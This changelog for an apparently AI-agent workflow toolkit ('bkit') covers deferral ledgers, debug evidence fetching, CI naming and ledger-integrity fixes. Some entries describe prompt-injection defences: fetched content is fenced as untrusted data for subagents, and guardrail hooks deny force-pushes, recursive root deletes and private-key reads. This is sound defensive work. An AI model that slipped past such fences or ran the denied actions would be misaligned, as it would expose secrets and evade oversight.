# Changelog

All notable changes to `@cbartens/bkit` are documented here.

Format: `## [version] — YYYY-MM-DD`

---

## [Unreleased]

### Added

- **Local tests first.** Exhaust the local suite and a targeted repro before remote CI. Deployed-boundary / `@live` that cannot reproduce locally → Existing evidence first.
- **Deferrals must justify themselves, and the ship sweep adjudicates them (#415).** `docs/deferrals.jsonl` rows now carry a required `reason` from a closed enum — `scope-declared` (with a `references` pointer to the design/plan § that pre-declared it), `hard-blocked` (naming the blocker), `needs-decision`, `own-cycle`, plus adjudicator-only `unjustified`. A writer that cannot pick one does not have a deferral, it has unfinished work. `@bkit-ship-deferred-sweep` gains a third track: exemption is EARNED, not self-granted — each declared deferral's `reason` is judged against four tests, and one that fails moves to `Lazy (unjustified)`, recorded via same-`key` ledger append and resurfaced by the ship summary. Lazy never blocks the merge (the branch is green by that step; a bounded fix is cheaper as follow-up than an aborted ship) — the catch moves earlier, to `@bkit-build-challenge-remediate`, which must now name a `reason` before writing a row and implement the finding instead when none holds. `bkit analysis` reports the unjustified-rate per `(subagent, model)` over `kind:"deferral"` rows, which separates a prompt that under-specifies when deferring is legal from a turn budget that runs out before the work does. Inside the build loop the catch is earlier still: `@bkit-build-plan-verify` no longer lets a `BLOCKED` log line or a deferral row discharge a plan task (only the codebase satisfies `Done when`), so unfinished work routes to `@bkit-build-plan-gaps-remediate` in-loop rather than surfacing at ship; and `@bkit-build-plan-execute` / `@bkit-build-plan-gaps-remediate` are barred from the ledger outright — their `BLOCKED` log line is the record. The writer list in `.bkit/jsonl.md` § Ledgers & Writers is now stated as exhaustive and mirrored as `DEFERRAL_WRITERS` data. Enforced by `validate()` on write, by `bkit-ledger-integrity.test.ts` over the folded live ledger (both the `reason` enum and the writer identity), and by the shared `Deferred work` prohibition in every workflow.
- **`/bkit-debug` fetches every class of failure evidence from `.agents/config.md`, not from a hardcoded stack (#418).** Step 4 previously hardcoded GitHub Actions, a workflow file named `ci.yml`, a branch named `dev`, pnpm + turbo and Playwright into four of its six evidence sub-steps; only runtime logs and the tracker scan were configurable. A consumer on GitLab got nothing from them, one whose workflow is `main.yml` silently got no diff, and one without turbo got a broken command — guarded correctly three hundred lines earlier in the same file. Worse, the e2e matcher `test("e2e"; "i")` matched a native lane that publishes no GitHub artifact, then downloaded the _web_ lane's `playwright-report` and filed it as that lane's evidence. Every sub-step is now a `debug-fetch` block carrying a `context=` attribute (`ci`, `diff`, `e2e`, `runtime` — the default — and `web`), enumerated, narrated `CHECKED` / `SELF-SKIPPED` / `NOT CONFIGURED` per block and per context before any fetch runs, and recorded as `contextsConfigured` on the status row. bkit ships copy-paste-ready examples inert inside the managed block and an advisory that names the missing contexts; nothing auto-enables, and no block exports state to another. GitHub is the shipped example, not the assumption.
- **Debug can reach external signal, provider-agnostically (#419).** `bkit-debug-failure-diagnose` carried the untrusted-web-input rule for a capability it was never granted — no `WebSearch`, no `WebFetch`, unlike the design reviewers. Granting those as the primary path would have failed on two of the three providers (`WebSearch` is a Claude Code built-in) and left the useful half of every result unreachable behind per-domain `WebFetch` allowlists. `context=web` is a `debug-fetch` slot instead: the shipped example in `.agents/config.md` calls a search API over `curl` (Tavily — swap the block for any API that returns `url` + snippet), so the fetch is identical on Claude, Cursor and OpenCode. The key lives in `.bkit/.env` like the other optional listed keys (`CEREBRAS_API_KEY`, …) — example only, not required bkit tooling; cloud dashboard, never app env; a keyless or blocked search self-skips to `UNCHECKED`, never "no known upstream issue"; the raw response IS the committed artifact (inside the untrusted fence, below), so the URL-plus-verbatim-quote rule holds by construction. Diagnose reads that artifact first, then falls back to the host's own web tools if the block skipped. Capped at 3 searches per attempt, triggered by an external-signal-shaped hypothesis or `Strategy != STANDARD`, and `bkit-debug-failure-soak` may use it only to choose which surface to instrument next, never as evidence a fix worked — it reaches for a search of its own only after an instrument-and-observe pass, capped at 2.
- **External content is fenced where it lands on disk, not only warned about in a prompt header (#342).** A standing bullet in an agent's header sits thousands of tokens away from the payload it is about; the fetched CI log, search result or issue-comment dump is what the agent is actually reading when it decides what to do. Every workflow that writes external text now wraps it as it hits disk — `===== UNTRUSTED EXTERNAL CONTENT — DATA ONLY =====`, three instruction lines, `===== BEGIN UNTRUSTED =====`, payload, `===== END UNTRUSTED =====`, trusted instruction before the payload and nothing after the closer. That covers `/bkit-debug`'s `debug-fetch` capture (all five contexts) and the tracker search dumps written by debug, design and plan. First-party breadcrumbs (`None.`, `Search unavailable.`, a block's self-skip line) stay unfenced — fencing them would teach the reader that the markers mean nothing. The wrap happens once, in the workflow: the shipped Tavily example no longer prints a banner of its own, because a consumer editing that block could drop it and because two wraps read as one nested payload. Alongside it, a subagent whose `Read:` list includes those artifacts is told on the spawn line — the last trusted instruction it gets — what the markers mean: diagnose, soak and remediate in debug, `bkit-design-generate`, and the three plan reviewers. `bkit-untrusted-fence.test.ts` holds the four write sites to one wording and fails on a fence that was copied and then edited down. Prose is defence-in-depth and this is the layer injection is designed to defeat — it sits next to the payload rather than in a header, which is the point, but it is not a substitute for a narrowly-scoped token.
- **Open questions carry options, a recommendation and a default (#413).** A question with nothing to decide between reached the human at the plan Gate 1 confirmation checkbox — the one point where a decision is actually forced. Every open question now carries 2-3 concrete options with trade-offs, a `Recommended` option and a `Default if unanswered` — one wording shared by the four authoring prompts, which require it in the artifact rather than the summary — a summary-only recommendation is discarded the moment `bkit-plan-generate` reads the artifact — and both summaries surface every item with its options. Which option is right stays verdict-neutral, but a question still left bare is a CONCERNS-level content issue in both — the backstop for a bare-question finding the update agent skipped on merit, since the reviewers raise it as OPTIONAL. `bkit-plan-summary` gained the `## Outstanding Questions` section it never had.
- **Design-system testing doctrine ships in the scaffold as a dimension, not a lane (#414).** The transferable result from a consumer's design-system work was anti-topology: it added no design lane and no design browser-project, because the lane axis is resource profile (a millisecond file read vs a booted app plus browser plus DB), not subject matter. bkit's scaffold previously said nothing, leaving the default instinct — add a `bkit-tests-design` lane — unguarded. `docs/testing.md` gains § Design assertions are a dimension, not a lane (layer-to-tier map, the hand-maintained reference hierarchy with each implementation asserted independently so a red names its own culprit, no advisory window, group tags with zero routing power, the task-runner cache footgun, and keeping the honest first-run reds behind named allowlist constants), plus two rows in the tier rubric so design coverage reaches every plan's Derived Test Matrix automatically. `docs/design.md` gains the reference contract and an example table, and the CI reference an anti-stub note deliberately not using the `bkit-stub:` header form, which would advertise a block nobody should enable. Doctrine only — no Tailwind, axe, Playwright or Next specifics.

- **Widen bkit-cloud trigger to post-merge `dev` CI (#363).** `bkit-cloud.yml`'s `workflow_run` trigger now also fires on `fix/**` and `dev` CI completion (previously `feat/**` only; `main` is deliberately excluded — dev->main promotion stays manual). A post-merge `dev` CI failure auto-dispatches `/bkit-debug {FID}` (FID recovered from the squash-merge commit scope, tracker-agnostic); success is a no-op. `/bkit-ship` now threads the `bkit [auto route]` marker onto the squash-merge commit subject (when the issue carries `bkit:auto`) so the same free-tier gate admits the new trigger. Cross-session dispatch loop bounded by `MAX_DEV_DISPATCH_ATTEMPTS=3` (distinct failed CI SHAs per FID, shared by the `dev` and newly-folded `fix/**` surfaces); `dev` concurrency switches to queue-not-cancel so an in-flight `/bkit-debug` run is never cancelled mid-flight.

- **One local gate, named by what it runs, shared by agents and humans (#437).** Eight prompts and two workflows each carried their own `if [ -f turbo.json ] … else jq -e ".scripts[…]"` copy of the lint/typecheck/test command. A consumer on any other toolchain matched none of the probed script names, got `TEST_SCOPE=""`, and `eval ""` exited 0 — the agent recorded a gate that ran nothing. `bkit-build-challenge-tests` was already in that state on this repo: turbo-only, no fallback. Replaced by two layers in `package.json`. **Lanes** (`bkit:lane:static`, `:unit`, and consumer-declared `:integration`, `:e2e`, `:live`) are named after the `ci.yml` job ids and hold the real commands — a turbo monorepo puts its `--filter` form there, a Python repo puts `pytest`; bkit never reads the value. **Gates** chain lanes in canonical order and the NAME enumerates them (`bkit:gate:static-unit`, `bkit:gate:static-unit-integration-e2e-live`), so a caller reads the coverage without opening `package.json` and `scope` in `status.jsonl` describes itself; where a step is not a lane the name spells out the steps (`bkit:gate:format`, `bkit:gate:install-static-unit-build`). `.husky/pre-commit` and `.husky/pre-push` run the same scripts, so a green push and a green agent gate now mean the same thing; `ci.yml` deliberately stays off them (per-step reporting, affected-package conditionals, heavier tiers). Build Step 14 and debug Step 3 run the DEEPEST gate the consumer declares — build through integration, debug through live — and fail loud when none resolves, instead of skipping. The deep lanes and gates are NOT seeded: declaring one is how a repo opts a workflow into that tier, and a repo without an integration tier is visibly gated at `bkit:gate:static-unit` rather than quietly claiming more. Two gaps closed on the way: the retired probe never ran `slop:delta` (the enforcing slop gate both CI and pre-push run), and no local gate ran `lint` at all though CI's static lane does. `bkit-local-gate-audit.test.ts` pins every call site, both descending probes and the fail-loud branch, so copy number four fails the suite.

### Changed

- **Shipped docs describe the current setup only — no internal identifiers, no history.** Removed 61 tracker issue numbers, retired ledger keys (`KN-*` / `DE-*`) and coined guard names (`EC-1`, `EC-2`, `R2-1`) from the 10 consumer-shipped docs: `.bkit/workflows.md`, `.bkit/cloud.md`, `.bkit/README.md`, `.bkit/jsonl.md`, `.bkit/providers.md`, `.bkit/prompts.md`, `.bkit/trackers.md`, `docs/deployments.md`, `docs/testing.md`, `docs/security.md` and the `.bkit/templates/docs/` mirrors. Sentences that existed only to record a change now state the rule instead. `cloud.md`'s `# Decision log` section is gone — decisions live in `docs/decisions.jsonl`, incidents in `docs/knowledge.jsonl`. Each doc's Rules block states the constraint; `bkit-shipped-docs-refs.test.ts` enforces it over the manifest corpus.
- **Workflow files carry instructions only.** Stripped rationale comments, finding labels and removal explanations from `bkit-auto.md`, `bkit-build.md`, `bkit-debug.md` and `bkit-ship.md`, rehoming the reasoning to `.bkit/workflows.md`. `bkit-auto` Step 5 routes on the fence's exit code with a `Route:` block, surfaces its resolved vars, and drops the per-step mode guards; ship Step 5's lead-in matches the sibling conditional-suffix fences. The authoring rule that named `.bkit/workflows.md` as the home for internal labels now says to drop the label and name the behaviour — that file ships too.

### Changed

- **One verb scheme across every CI step name, so a red run can be triaged before opening a log.** `Guard`, `Validate`, `Verify` and `Audit` all meant "fail the job if this isn't true" — four spellings of `Assert` — while `Check` did double duty for both blocking and non-blocking steps, which is the one distinction that matters when scanning a failure. The scheme is now `Assert` (a red here is real), `Check` (looks and reports, cannot red the lane), `Run` (invokes a named tool or suite) and `Report` / `Upload` / `Count` / `Merge` / `Fetch` (move or publish results). `Guard Migration Immutability` → `Assert Migrations Immutable`, `Validate Environment` → `Assert Environment Shape`, `Test Presence Audit` → `Check Test Presence`, `Verify Dist Freshness` → `Assert Dist Freshness`, `Status-Hole Detector (advisory)` → `Check Status Holes`. Two corollaries applied with it: name a tool the way the tool is named (`Run actionlint`, `Run bkit Check`), and drop a qualifier the job name already carries (`Run Unit Tests`, not `Run Vitest Unit Tests`) — keeping a bracket only where it disambiguates two steps and mirrors a literal flag or tool (`Run Slop Scan (full)` / `(delta)`, `Run Shell Tests (bats)`). `Check SHA Cache`, `Check Stale Test Data` and `Check Default Branch Lags Dev` keep `Check` because all three genuinely cannot red their lane. The scheme is written down in `docs/testing.md` § "Step names say whether a red is real"; the template is seed-or-print, so this reaches new installs only.
- **The two composite-action traps are now shipped doctrine rather than folklore.** `docs/testing.md` gains § "Composite actions: two things that cost a red CI to learn": a local composite cannot own the checkout that fetches it (the runner resolves `uses: ./…` from its own filesystem, so a composite that contains `actions/checkout` and is called first reds with "can't find action.yml"), and job-level `env:` reaches a composite step's process but not its `env` expression context, so `if: env.VERBOSE_CI == '1'` inside a composite is permanently false and the step silently never runs. The second is the neighbour of the `NODE_OPTIONS` defect below — the `env` context is unavailable to a job-level `env:` **value** too — and both are stated together because a consumer who hits one reaches for the other.
- **A guard asserts the rule, not the sentence that explains it.** New `docs/testing.md` section, prompted by a seed-repo cleanup where three guards turned out to assert the prose around an invariant rather than the invariant: `expect(content).toMatch(/bootstrap paradox/)` protected a real rule, and tidying that phrase out of a comment reddened the guard while the rule was untouched. The section states the failure mode, the three practical rules (pin the mechanism not the wording; derive the list from the file under test so a new lane is covered without editing the guard; put the bug back and watch it red before trusting it), and the exception that must not be mistaken for the rule — when the shipped artefact _is_ prose (a rules file an agent reads, a CLI help string, an advisory message) the wording is the behaviour. `bkit-rules-sync.test.ts` now says on its own prose assertions that they are that exception.
- **Shipped config templates carry no tracker numbers and no history.** Forty internal references were living in files that land verbatim in a consumer repo — ten in the CI template, twenty-nine in the cloud workflow, four in the Renovate config. A `#N` there is worse than useless: it points at an issue in bkit's tracker the consumer cannot read, or at whatever issue happens to carry that number in _their_ tracker. Each is replaced by the reason it was standing in for, and two paragraphs describing what the cloud workflow "used to" do are restated as the rule that holds now. `bkit-shipped-docs-refs.test.ts` already gated shipped markdown and the execution surfaces; it now gates the seeded config corpus too (workflows, Renovate, Dependabot, Vale styles, slop-scan) for both tracker references and history prose — the gap that let forty of them survive. Both new checks were confirmed to red on a reintroduced violation.

### Fixed

- **Cursor's command picker shows the workflow description, not the version stamp.** Cursor prints a command file's literal first line as its description and does not read frontmatter, which is why `applyT1` strips it — but it dropped the `description:` value outright, so the `<!-- bkit:managed … -->` comment stamped immediately afterwards stood in as the description for all eight `/bkit-*` commands. `applyT1` now replaces the frontmatter with its `description` value as a plain first line, derived at render time so it cannot drift from the string Claude Code shows, and `stampManagedVersion` sinks the marker below the file's first heading whenever there is no frontmatter, falling back to the old top-prepend only for headingless content. OpenCode keeps `**Session prompt:**` on line 1 — its `$ARGUMENTS` anchor has to stay at the top — but no longer leads with an HTML comment. Agents were never affected on any host: they keep their frontmatter, so their marker already sat below it. Marker text is unchanged and the drift gate reads position-independently, so `bkit check` still hard-fails on a stale render.
- **The shipped `[verbose ci]` knob set `NODE_OPTIONS` in a way the runner refuses, on a run that still went green.** The scaffold's `Configure Verbose CI` step wrote `NODE_OPTIONS=--trace-warnings --trace-deprecation` to `$GITHUB_ENV` in both seeded lanes, and the stub catalogue told consumers to do the same. The runner blocklists `NODE_OPTIONS` for that command — a step able to set it at runtime could inject code into the runner's own node process — so the write is rejected with `##[error]Can't store NODE_OPTIONS output parameter using '$GITHUB_ENV' command.` while the step's conclusion stays `success`. The flag reached nothing, and two things hid it: the very next line writes `DEBUG`, which is not blocklisted and propagates normally, so the step looked half-alive rather than broken; and bkit's own CI declares no `VERBOSE_CI` at all, so the annotation never appeared on a dogfood run. `NODE_OPTIONS` is now a job-level `env:` key in static YAML on every lane declaring `VERBOSE_CI` — inside the managed `verbose-ci-env` block, so existing consumers pick it up through the usual drift advisory. The `contains()` marker test is spelled out rather than reused as `env.VERBOSE_CI`, because the `env` context is not available to a job-level `env:` value and the shorter form resolves empty on every run; and a step with its own `env:` block replaces rather than merges the job-level value, so it must restate the flags. Three guards in `bkit-templates-content.test.ts` hold it — no `$GITHUB_ENV` write, one marker-gated job-level key per `VERBOSE_CI` lane (derived from the declarations, not hand-listed), and no `env.VERBOSE_CI` in the gate — proved non-vacuous by reinstating the bug, which reds all three. `docs/deployments.md` and `docs/testing.md` both described it as a working global knob and now state where it must live.
- **The promotion-lag step was named for a default branch not every consumer has.** `Check Main Lags Dev` reads `$DEFAULT_BRANCH` at runtime and its own comment says the block is identical for every repo, so hard-coding "Main" in the display name was wrong for any consumer whose default branch is not `main`. Renamed to `Check Default Branch Lags Dev` in the template, in bkit's own `ci.yml`, in both copies of `docs/deployments.md` and across the `bkit-templates-content.test.ts` anchors. The step sits inside the byte-compared `main-lag-warning` block, so consumers see a non-blocking drift advisory until they re-sync — which is how the correction reaches them.
- **The capstone stub pointed straight at a hollow-green trap it could not warn about.** `bkit-stub:bkit-tests-check` described the required check as needing "no checkout" and then suggested adding a `continue-on-error`, run-level-gated checkout for the dead-test-file diagnostic. Both are right while the gate is inline shell — and both become wrong the moment it reads a file, because the required check then exits non-zero with a module-resolution error on every run level that skips the checkout, without ever reading the plan. The entry now says to extract the gate to a file (it is the only branch-protection required check, and assertions inside a YAML string are the one part of a repo that cannot be unit-tested), names the four tests worth writing as the ones proving it cannot pass, and states that extraction makes the checkout load-bearing: ungated, not `continue-on-error`, guarded, and not shared with the diagnostic's gated one. `Check Test Plan Followed` is renamed `Assert Test Plan Followed` to match.
- **The planner stub told consumers to scope a manual dispatch to `HEAD~1`.** `Resolve Base Ref` listed `dispatch->HEAD~1` with nothing about the consequence: a `workflow_dispatch` has no base commit, so any such fallback scopes the run to whatever the last commit happened to touch — dispatch on a docs or plan-close HEAD and the "run everything" button buys a static-and-unit run that reports green having proved nothing. The line now says a dispatch is not a diff, and to short-circuit it to the same run-to-be-safe values the no-base path already emits, the way the stub's own `run_migration` guidance already does. bkit was inconsistent with itself: run-to-be-safe for the migration signal, `HEAD~1`-scoped for everything else.
- **The shipped `.gitattributes` gave `merge=union` to two of the four append-only ledgers.** `docs/knowledge.jsonl` and `docs/decisions.jsonl` were covered; `docs/deferrals.jsonl`, `docs/failures.jsonl` and `.bkit/stats.jsonl` were not, though the same workflows append to them under the same rule (`.bkit/jsonl.md` § Updating a Row — friction is the one non-append-only ledger). Two branches that had each appended a different row therefore blocked a merge over data that never disagreed, and because the whole file sits inside the managed block, a consumer's only recourse was an override below `bkit:end` — which bkit itself had quietly been carrying. All three added to the managed block. `.bkit/friction.jsonl` is deliberately excluded and says so in the block: `bkit harvest` removes rows from it, so union would resurrect a drain. The block now also states the constraint union creates rather than assuming it — union keeps both sides of a conflicting hunk, so an in-place edit leaves the stale copy alive beside its replacement and `fold()`'s last-wins-by-`ts` picks whichever is dated later. Editing a line, and writing a future `ts` (which outranks every correction that can ever follow it), are now stated as hard rules. `bkit-ledger-integrity.test.ts` gates the ledger list against both the rendered file and the template, refuses a blanket `*.jsonl` glob, and fails on any future-dated row.
- **The ship Failure Path committed and pushed twice, splitting one failure across two branches (#412).** It wrote `chore({FID}): ship FAILED` to `dev` and then `docs({FID}): ship aborted` to `feat/{FID}` — five minutes apart on the #380 ship. The branch half is the half that gets lost: `ship-handover.md` and `ship-deferred-sweep.md` existed only on a branch a failed ship never merges, which worktree-prune, branch delete or a later force-with-lease each destroy (already an open `docs/failures.jsonl` row, hand-recovered once). The second push also mutated a still-open, CI-validated PR head with a `[skip ci]` commit, the guard `build` has and ship did not. All git writes now collapse into one flush block at the end: steps 1-6 create no git object, the tree and push target are chosen by `RUNTIME_DEVPUSHES` exactly as the Close step does it (cloud runs no longer attempt a `dev` push they cannot make), dev ops assert the checkout is actually on `dev` before pulling, branch-side artifacts are reconciled into `BOOK_ROOT` first, and the handover assertion no longer routes back into the Failure Path it is already inside. The `.deferred-blocked` / `.rebase-failed` sentinels are gitignored so path-scoped staging cannot carry them into the record.
- **Month-bucket and FID discovery picked the oldest match rather than the right one (#416).** Ten `head -1` traversals over `docs/plans/` did two different jobs and both chose wrongly. The five FID hints after an interrupted run sorted ascending across every feature and every month, so they named the alphabetically-first feature in the oldest bucket — while an interrupted run is by definition the most recent; they now resolve by leftover `.lock` file, which _is_ the interrupted feature rather than a proxy for it, falling back to the newest bucket (never plain `ls -dt` on the directories, since appending to `status.jsonl` does not touch the parent's mtime). The five month-bucket resolutions for a known FID now detect more than one bucket and fail loudly naming both paths, because neither ordering is correct — oldest reads a superseded design, newest makes an already-built feature look brand new. And `bkit-design.md`, the only workflow that hardcoded `date +%Y%m` instead of discovering, now discovers: a re-run in a later month was silently creating a second live design in a second bucket, and a design crossing a month boundary mid-run failed at close with `No design version found`.
- **Design and plan close steps overwrote the existing canonical doc (#417).** `cp` straight over `{FID}-design.md` / `{FID}-plan.md` with no existence check. It only bites on a deliberate re-run — an interrupted run resumes after the last `DONE` step and regenerates nothing — which is exactly when the old document is finished, reviewed and possibly already built against. Both close steps now move any existing canonical doc to `docs/plans/{YYYYMM}/archive/{TIMESTAMP}-…`, skipping when the content is unchanged, and the plan move takes the whole `{FID}-plan-{N}.md` sub-plan set together so a re-run that splits into fewer children leaves no orphans. A sibling `archive/` directory rather than a rename in place: appending a timestamp to a plan produces a name matching the sub-plan count glob (flipping a single-plan feature into split mode) and archives left flat in `logs/{FID}/` would be fed to the ship doc-sync agent as though they described what shipped. The second half is closed too — design and plan were the only phases that reused a feature's identity without reading its prior output. The superseded doc now reaches the generating agent (`bkit-design-generate`, `bkit-plan-generate`) and nothing else, as context to consider rather than a baseline to revise. Deliberately **not** via `{phase}-input.md`: that file fans out to the sibling-blind ideate triplet on the design side and to the review triplet plus summary on the plan side. A document is only superseded because it was rejected, outdated by its own design, or proved unbuildable, so the default assumption is that it is wrong — one generator told to weigh it can, three reviewers hunting for faults cannot tell which parts caused the re-run and read a deliberately fixed defect as a regression. Whatever is worth keeping survives into `{workflow}-v1-draft.md` and reaches everyone downstream there, in adopted form.
- **Three `/bkit-ship` staging blocks could lose a run's entire bookkeeping and report success.** The Failure Path flush, the Step 3 conflict-resolve push and the Step 13 close all ran `git add $BOOK_PATHS` without resolving `BOOK_PATHS` in that block. It is a Step 1 placeholder, like `BOOK_ROOT` — but the two fail differently: an empty `BOOK_ROOT` makes the next `jq >>` die on `/docs/plans/…`, while an empty `BOOK_PATHS` makes `git add` a no-op that **exits 0**. The Failure Path then printed `no bookkeeping delta to record — nothing committed, nothing pushed`, and the close step's `commit --allow-empty` landed an empty commit and pushed it. Both read as success while the status rows, telemetry and handover artifact stayed on disk, uncommitted — the exact loss the single-flush shape was built to prevent. All three now build the allow-list themselves and refuse to stage when it is empty; `tests/ship-failure-path.bats` pins the count at three and asserts the guard.
- **An unknown `debug-fetch` `context=` said `NOT RUN` and then ran the block.** The `*)` arm logged the message, set an empty artifact prefix and fell through, so a typo'd context still executed the block — a billed API call for `context=web` — and wrote the output to `…/-<name>-<attempt>.md`, a path the step's `debug-context-*` glob cannot match. The evidence was dropped from `artifacts` and from `FETCH_VERDICT` while the run reported it was never fetched. The arm now exits.
- **`contextsConfigured` recorded `[]` on runs that fetched every context.** The status row derived it from `FETCH_BLOCKS`, set two Bash blocks earlier; every other value in that block is re-derived precisely because shell state does not cross a block boundary. The telemetry field claimed nothing was configured and the tracker comment marked all five contexts `NOT CONFIGURED`. It now re-enumerates from `.agents/config.md`.
- **Two `debug-fetch` blocks sharing a `context` + name spliced into one.** Block bodies were selected by matching that pair, so a repeat concatenated both bodies and wrote them to a single artifact path — and the context-coverage advisory tells consumers a second test lane needs its **own** `context=e2e` block, with naming optional. Selection is now by ordinal from the same enumeration pass; the artifact path grows the ordinal only when a pair actually repeats, so every single-block context keeps its documented name.
- **The debug-fetch context advisory nagged repos with no such lane, and the only mute silenced everything.** `observability-debug-fetch-context-missing` fired on any repo lacking a `context=e2e` block — including bkit itself, which has no e2e lane — and the sole opt-out, `<!-- debug-fetch:none -->`, also dismissed the advisories that catch a repo with no blocks at all or an unenabled source, while being untrue for a repo that has wired others. The marker now takes context names (`<!-- debug-fetch:none e2e -->`) that dismiss those contexts only; a bare marker keeps its blanket meaning.
- **The marker parsers in TypeScript and awk disagreed on whitespace.** `parseDebugFetchStart` accepted exactly one space between attributes; the workflow's awk splits on `[ \t]+`. A marker written with a tab or a double space ran under `/bkit-debug` while every `bkit check` advisory reported it absent. Both now share one grammar, pinned by `bkit-debug-fetch-contexts.test.ts`, which also asserts the five-value context list agrees across the TypeScript const, the two shell loops, the workflow `case` and the consumer table — `DEBUG_FETCH_CONTEXTS` was exported and never read, so nothing enforced the mirroring its own doc comment claimed.
- **An `unjustified` deferral verdict could be erased by the writer it judged.** `fold()` is last-write-wins over the whole row, so the next same-`key` append decides whether the adjudication survives, and `computeDeferralDiscipline` rates the folded entity — a later row omitting `reason` dropped the finding and the writer's rate with it. `.bkit/jsonl.md` stated the carry-forward; nothing enforced it. `bkit-ledger-integrity.test.ts` now fails when an entity's history contains `unjustified` and its current state does not.
- **The shipped CI templates had no bot watching their action pins.** `.bkit/templates/**` sits in Renovate's `ignorePaths` — correct for consumers, but it also means bkit's own weekly bumps never reach the templates those workflows were copied from, and the template snapshot pins the stale SHA as expected output so nothing else fails either. `actions/checkout`, `pnpm/action-setup` and `davelosert/vitest-coverage-report-action` are bumped to the versions bkit actually runs; `actions/setup-node` is held back on record (the repo passes `node-version-file`, the template `node-version`, so the v6 -> v7 major needs verifying against that input). New `bkit-template-action-pins.test.ts` fails on any future drift.
- **A run sentinel was committed and left tracked.** `docs/plans/202607/logs/380-roadmap-analysis-refresh/.deferred-blocked` landed in a `ship FAILED` commit before the ignore rules for `.deferred-blocked` / `.rebase-failed` existed; because git ignores nothing already tracked, the new rules could not evict it. Untracked.
- **`lint:prose` silently self-disabled in worktrees and fresh checkouts, so the pre-commit prose gate passed while enforcing nothing.** The script gated on `command -v vale >/dev/null 2>&1 && [ -d .vale/styles/write-good ]` and, when either check failed, echoed one quiet line and exited 0. `.vale/styles/write-good` is gitignored — `vale sync` downloads it — so it is absent in every fresh clone and every `git worktree add`. Because `.vale/styles/House` **is** tracked, the parent directory exists and nothing looks wrong. Commits made from a worktree therefore skipped prose linting entirely and still reported success; the same content failed the instant it was committed from the main clone. The guard conflated two different conditions: an absent `vale` binary (nothing to be done — the deliberate F9/BAR-138 soft-skip that keeps bkit from breaking a consumer's commit) and unsynced styles (fully recoverable). `lint:prose` now self-heals the recoverable case — it copies `write-good` from the main worktree via `git rev-parse --git-common-dir` (zero network, works from any linked worktree), falling back to `vale sync` — and when `vale` is present but neither worked it says so **loudly on stderr** instead of emitting a line nobody reads. The silent skip is now reserved for a genuinely missing `vale` binary, so the consumer contract is unchanged. bkit's own five workflows already copied `write-good` into `.worktrees/{FID}` at worktree-setup, which masked the hole for bkit-created worktrees; harness worktrees (`.claude/worktrees/*`), manual `git worktree add`, and plain clones had no such cover.
- **Correcting a shipped `package.json` script default reached new consumers only.** `ensurePackageJsonScripts` is add-if-missing and never overwrites, so the fixed `lint:prose` above would have left every existing install on the version that self-disables. It now accepts an optional `legacyValues` map: a script whose current value **byte-matches a listed prior bkit default** is provably bkit's own and gets re-pointed at the current default, while anything matching neither the current nor a legacy value is consumer-customised and left strictly alone. The uninstall stripper (`stripManagedKeys`) consults the same list, so a consumer who installed before the change and never re-ran install no longer ends up with an orphaned `lint:prose` after uninstall. The managed script, its legacy predecessors, and the F9 advisory remedy text now come from single exported constants (`LINT_PROSE_SCRIPT` / `LEGACY_LINT_PROSE_SCRIPTS` in `bkit-manifest.ts`) rather than three hand-synced copies that the byte-compare depended on staying identical.
- **The no-dead-`MAX_*` audit no longer accepts a comment as enforcement.** `MAX_DEV_DISPATCH_ATTEMPTS` is enforced in `bkit-cloud.yml`, outside the scanned workflow corpus; the corpus named it only in a rationale comment. The rule now counts executable lines across both surfaces and ignores comments.
- **Repaired four corrupt `.bkit/friction.jsonl` rows and gated the ledgers.** One row's `ts` was a literal, unexpanded `$(date +%s)000`, which made the line invalid JSON — and one bad line makes `jq` reject the whole file, so `bkit harvest` and every fold over that ledger had been failing since it landed. Three sibling rows used a `detail` field with no `kind`, the field that routes a row to its ledger. New `bkit-ledger-integrity.test.ts` asserts the live ledgers parse, carry `ts`/`kind`/`repo`/`bkitVersion`, hold only their own `kind`, and smuggle no unexpanded shell substitution.

---

- **Design subagents were pointed at a plan-phase file they never receive.** `bkit-design-update` and `bkit-design-summary` cited `docs/plans/template.md` — for the open-question shape and for the `Acceptance Scenario` spec respectively — but `.bkit/workflows/bkit-design.md` never passes that file to any subagent, so an agent following the pointer had nothing to open. Both prompts now state the requirement themselves, in the wording `bkit-design-generate` already uses. The template's `Spec — what good looks like` section correspondingly drops its claim over the design phase: it named design synthesise and design summary among the subagents that MUST follow it and declared itself the single source of truth, while those prompts had always carried their own copy of the rules.

## [4.10.0] — 2026-07-27

Pins Z.AI agents onto the live GLM-5.2 Coding Plan catalog and makes host thinking knobs data-driven from `prompts.md`, so `xhigh` agents actually hit GLM max reasoning instead of a hardcoded one-size ladder. Also splits the README paste blocks into install vs upgrade so consumers stop bumping the package without resyncing managed files.

### Changed

- **Z.AI column pins to GLM-5.2 / 5.1 / 4.5-air.** Opus + convergent → `zai/glm-5.2`, sonnet → `zai/glm-5.1`, haiku → `zai/glm-4.5-air` (live-probed Coding Plan catalog + tool-call smoke). Docs in `providers.md` match.
- **Effort → provider thinking is loaded from `prompts.md` at install.** The shared Default/Claude/Cursor/OpenCode/NVIDIA/Z.AI/Moonshot table drives Claude `effort:`, Cursor `effort:`, and OpenCode `reasoningEffort:` — no hardcoded ladders in TS. Z.AI collapses to `none` / `high` / `max`, so prompt `xhigh` emits `reasoningEffort: max` on GLM-5.2.
- **README quick-start splits install vs upgrade paste blocks.** Upgrade path prefers `bkit upgrade --latest` (package bump + managed resync); warns against a bare `pnpm add` that leaves managed files stale. Clarifies classic-PAT `source` / `.npmrc` auth steps.

---

## [4.9.0] — 2026-07-27

Closes the pre-release audit gaps that would have shipped a CI drift blind spot and a Cursor host without the destructive-op / secret-exposure gates Claude and OpenCode already enforce. Also lands the always-on migration-lane CI scaffold and first-party-only Cursor model defaults that accumulated on `dev`.

### Added

- **Cursor destructive-op / secret-exposure guardrails.** `.cursor/hooks/guardrails.cjs` + `beforeShellExecution` / `preToolUse` (`Read|TabRead`) wiring in `.cursor/hooks.json` deny force-push and recursive root deletes, ask on privileged git/publish/sudo, deny private-key reads, and ask on `.env` — parity with Claude `permissions` and OpenCode `permission` maps. (surfaced by the 4.9.0 pre-release audit)

### Changed

